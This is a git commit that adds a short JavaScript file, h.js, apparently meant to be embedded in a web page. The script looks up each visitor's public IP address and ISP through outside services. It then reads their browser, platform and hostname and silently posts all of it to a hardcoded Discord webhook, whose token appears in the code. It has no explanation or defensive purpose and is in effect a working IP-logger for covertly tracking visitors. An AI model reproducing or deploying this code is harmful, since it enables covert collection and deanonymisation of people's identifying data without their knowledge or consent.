52c2a53274fc9299fade1ebc04936d886f0cd338
49rip <146723162+49rip@users.noreply.github.com>
2024-01-28 09:49:02 +0300

    Create h.js

---
+++ h.js
@@ -0,0 +1,30 @@
+const timestamp = Date.now();
+
+
+let ip = "";
+let browser = window.navigator.userAgent;
+let os = window.navigator.platform;
+let userAgent = navigator.userAgent;
+let hostName = window.location.hostname;
+let isp = "";
+
+
+fetch("https://api.ipify.org")
+  .then(response => response.text()) 
+  .then(data => { 
+    ip = data;
+    return fetch(`https://ipapi.co/${ip}/json/`); 
+  })
+  .then(response => response.json()) 
+  .then(data => { 
+    isp = data.org;
+    
+    const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}\nISP: ${isp}` };
+    fetch("https://discord.com/api/webhooks/1200798509234933770/rZl03dTu_SO0IozUnSd1POxZx7pE-zoIqfA-5sklYcR8ptISHA5ADIpjFs5F5zk_wPiN", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
+      .then(() => console.log("success")) 
+      .catch(() => { 
+        const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}` };
+        fetch("https://discord.com/api/webhooks/1200798509234933770/rZl03dTu_SO0IozUnSd1POxZx7pE-zoIqfA-5sklYcR8ptISHA5ADIpjFs5F5zk_wPiN", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
+          .then(() => console.log("Success! (fallback)")) 
+      }); 
+  }); 
